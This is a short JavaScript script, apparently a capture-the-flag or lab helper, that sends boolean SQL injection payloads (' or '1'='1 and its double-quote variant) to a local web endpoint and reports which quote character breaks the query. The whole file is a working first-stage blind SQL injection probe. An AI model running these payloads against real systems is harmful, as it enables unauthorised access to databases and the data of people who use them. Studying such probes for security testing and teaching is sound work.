const URL = 'http://localhost:3000/static';

async function isTrue(payload) {
    try {
        const resp = await fetch(`${URL}?id=${encodeURIComponent(payload)}`);
        const text = await resp.text();
        return text.trim() === 'TRUE';
    } catch (error) {
        return false;
    }
}

(async () => {
    if (await isTrue(`' or '1'='1`)) {
        console.log('use \'')
    } else if (await isTrue(`" or "1"="1`)) {
        console.log('use \"')
    } else {
        console.log('Safe')
    }
})();